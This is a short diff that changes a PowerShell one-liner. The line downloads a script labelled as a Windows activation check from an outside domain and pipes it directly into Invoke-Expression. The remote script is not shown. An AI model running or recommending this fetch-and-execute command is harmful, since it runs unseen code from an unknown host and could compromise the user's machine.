@@ -1,1 +1,1 @@
-irm https://multi.jonatanaurumvault.uk/Windows/CheckActivation.ps1 | iex
+irm https://multi.jonatanaurumvault.uk/Windows/CheckWindowsActivation.ps1 | iex
